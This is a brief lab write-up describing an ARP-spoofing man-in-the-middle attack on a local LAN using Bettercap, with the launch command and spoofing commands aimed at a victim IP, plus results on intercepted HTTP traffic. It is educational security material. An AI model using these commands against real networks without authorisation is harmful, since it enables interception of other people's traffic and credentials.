# MITM Attack - ARP Spoofing

## Objective
Perform a Man-in-the-Middle attack to intercept network traffic.

## Lab Setup
- Attacker: Kali Linux
- Victim: Windows machine
- Network: Local LAN

## Tool Used
Bettercap

## Command

```bash
sudo bettercap -iface eth2
```
## Attack Steps

- net.probe on
- set arp.spoof.targets 192.168.1.10
- arp.spoof on

## Results

- HTTP traffic successfully intercepted
- Plaintext data visible in network packets
- HTTPS traffic remains encrypted

## Analysis

This lab demonstrates how insecure protocols can expose sensitive data during a MITM attack.

## Conclusion

ARP spoofing can be effective in local networks without proper protections.
